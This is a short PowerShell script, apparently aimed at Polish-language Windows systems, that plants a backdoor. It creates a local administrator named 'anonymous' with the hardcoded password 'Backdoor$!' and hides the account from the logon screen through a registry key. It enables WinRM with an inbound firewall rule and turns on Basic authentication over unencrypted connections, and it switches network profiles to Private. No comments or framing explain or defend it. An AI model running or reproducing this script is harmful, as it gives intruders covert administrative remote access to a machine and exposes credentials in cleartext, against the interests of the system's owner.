$Anonymous = "Backdoor$!"

$activeProfiles = Get-NetConnectionProfile | Where-Object { $_.NetworkCategory -ne 'Private' }
foreach ($profile in $activeProfiles) {
    Set-NetConnectionProfile -InterfaceIndex $profile.InterfaceIndex -NetworkCategory Private
}

Enable-PSRemoting -Force
Set-Service -Name WinRM -StartupType Automatic
Start-Service -Name WinRM

$Username = "anonymous"
$Password = ConvertTo-SecureString $Anonymous -AsPlainText -Force
New-LocalUser -Name $Username -Password $Password -FullName "Anonymous Admin" -Description "Hidden admin user"
Add-LocalGroupMember -Group "Administratorzy" -Member $Username

New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $Username -Value 0 -PropertyType DWord -Force

New-NetFirewallRule -DisplayName "Allow WinRM HTTP" -Direction Inbound -LocalPort 5985 -Protocol TCP -Action Allow

Set-Item -Path "WSMan:\localhost\Service\Auth\Basic" -Value $true
Set-Item -Path "WSMan:\localhost\Service\AllowUnencrypted" -Value $true
